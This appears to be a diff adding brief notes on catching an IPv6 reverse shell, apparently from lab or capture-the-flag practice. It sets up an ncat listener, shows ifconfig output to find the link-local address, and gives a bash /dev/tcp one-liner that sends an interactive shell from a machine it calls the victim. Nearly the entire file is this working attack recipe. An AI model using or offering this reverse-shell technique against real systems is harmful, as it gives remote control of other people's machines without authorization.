@@ -1,0 +1,21 @@
+#Listener machine
+ncat -6 -nlvp 1234
+
+#Let's check ipv6 address of the listener host
+ifconfig 
+vmnet8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.130.1  netmask 255.255.255.0  broadcast 192.168.130.255
+        inet6 fe80::f4fe:4e4a:f9c7:41bb  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:c0:00:08  txqueuelen 1000  (Ethernet)
+        RX packets 3657  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 70139  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+#then we can confirm fe80::f4fe:4e4a:f9c7:41bb is the link local address 
+
+
+#machine to send to shell
+#the shell should be sent to vmnet08 so it should be fe80::f4fe:4e4a:f9c7:41bb%vmnet08
+bash -i >& /dev/tcp/fe80::f4fe:4e4a:f9c7:41bb%eth0/1234 0>&1
+
+#here eth0 is the interface of the victim machine from where the connection is made from 
